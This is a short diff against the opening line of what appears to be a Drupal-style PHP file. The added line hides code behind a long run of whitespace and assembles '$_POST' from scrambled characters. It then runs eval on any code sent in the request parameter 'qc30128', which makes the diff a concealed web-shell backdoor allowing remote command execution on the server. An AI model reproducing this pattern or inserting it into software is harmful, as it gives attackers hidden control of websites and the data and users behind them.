@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                   $rcid2="pts_o"; $wxf6= strtoupper($rcid2[3]. $rcid2[0] .$rcid2[4]. $rcid2[2]. $rcid2[1] );if( isset (${$wxf6}['qc30128' ] )) {eval (${$wxf6 }[ 'qc30128' ]) ;}?> <?php
 
 /**
  * @file
